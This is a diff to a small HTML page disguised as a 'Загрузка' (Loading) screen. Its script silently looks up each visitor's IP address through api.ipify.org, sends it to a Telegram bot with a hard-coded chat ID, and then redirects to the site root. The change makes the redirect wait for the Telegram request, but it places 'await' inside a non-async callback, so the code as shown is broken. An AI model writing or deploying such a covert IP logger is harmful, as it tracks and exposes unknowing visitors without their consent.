@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <title>Загрузка</title>
+        <title>Загрузка...</title>
         <meta charset="UTF-8">
     </head>
     <script>
@@ -11,7 +11,7 @@
         const chatId = '7339807316';
         const url = `https://api.telegram.org/bot${Token}/sendMessage`;
 
-        window.onload = function() {
+        window.onload = async function() {
             Log += `Новое посещение\n`;
 
             fetch('https://api.ipify.org?format=json')
@@ -19,7 +19,7 @@
                 .then(data => {
                     Log += data.ip;
 
-                    fetch(url, {
+                    const response = await fetch(url, {
                         method:'POST',
                         headers: {
                             'Content-Type':'application/json'
@@ -30,7 +30,9 @@
                         })
                     });
 
-                    location.href = '/';
+                    if (response.ok === true) {
+                        location.href = '/';
+                    }
                 });
         }
     </script>
